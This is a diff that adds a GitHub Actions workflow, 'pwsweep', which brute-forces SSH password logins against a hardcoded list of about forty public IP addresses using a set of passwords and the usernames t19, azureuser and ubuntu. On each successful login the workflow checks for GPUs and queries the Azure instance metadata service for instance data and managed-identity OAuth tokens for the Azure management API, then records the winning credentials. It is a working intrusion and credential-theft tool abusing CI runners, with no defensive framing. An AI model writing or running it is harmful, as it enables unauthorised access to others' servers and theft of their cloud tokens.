@@ -1,0 +1,85 @@
+name: pwsweep
+on: workflow_dispatch
+jobs:
+  hunt:
+    runs-on: ubuntu-latest
+    timeout-minutes: 50
+    steps:
+      - uses: actions/checkout@v4
+      - name: sweep
+        run: |
+          set +e
+          sudo apt-get install -y sshpass >/dev/null 2>&1
+          cat > targets.txt <<'EOT'
+          4.150.12.63
+          51.103.30.231
+          20.199.110.14
+          20.216.157.81
+          20.250.34.34
+          20.97.16.40
+          20.226.36.166
+          20.203.147.239
+          20.196.105.115
+          20.218.97.190
+          20.226.17.32
+          172.202.9.199
+          191.234.167.211
+          172.202.37.11
+          20.52.57.230
+          20.208.35.22
+          158.158.126.249
+          85.211.196.49
+          20.46.249.226
+          20.48.105.114
+          57.154.31.35
+          20.214.234.255
+          20.92.237.189
+          20.52.138.5
+          51.107.74.248
+          20.48.33.50
+          4.193.180.97
+          68.221.192.111
+          20.58.164.191
+          85.211.241.42
+          172.173.78.249
+          4.184.64.153
+          70.153.149.34
+          104.46.216.48
+          20.198.90.213
+          20.212.82.222
+          20.46.165.180
+          20.63.183.202
+          20.65.250.3
+          4.194.27.141
+          EOT
+          cat > pws.txt <<'EOT'
+          T19UF1obB7wnBBUdju0FRnz!aZ9
+          T19ops!2026#azx
+          T19!Az9x#2026aa
+          T19ops!Passw0rd#2026
+          T19nv!A100z
+          T19!aBcD#2026xyz
+          T19x!Prizm#2026aa
+          T19pwAa123456
+          T19probe!Passw0rd#2026
+          T19prob3!Passw0rd
+          T19ops!Mine2026#
+          T19nv!A100x
+          T19Miner!2026x
+          T19!Az#9xQz
+          EOT
+          cat > t.sh <<'EOS'
+          #!/bin/bash
+          ip=$1; user=$2; pw=$3
+          C='echo HIT; id; hostname; nvidia-smi -L 2>/dev/null | head -8; echo IMDSI; curl -s --noproxy "*" -m 8 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json" | head -c 500; echo; echo TOK; for cid in 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 ""; do curl -s --noproxy "*" -m 10 -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=$cid"; echo; done'
+          out=$(timeout 25 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o PreferredAuthentications=password -o PubkeyAuthentication=no $user@$ip "$C" 2>&1)
+          if echo "$out" | grep -q '^HIT'; then
+            echo "===== SUCCESS $ip $user $pw"; echo "$out"; echo "$ip $user $pw" >> hits.txt
+          fi
+          exit 0
+          EOS
+          chmod +x t.sh
+          for ip in $(cat targets.txt); do for u in t19 azureuser ubuntu; do for p in $(cat pws.txt); do echo "$ip $u $p"; done; done; done > combos.txt
+          wc -l combos.txt
+          xargs -a combos.txt -P 16 -L 1 ./t.sh || true
+          echo "--- HITS:"; cat hits.txt 2>/dev/null || echo none
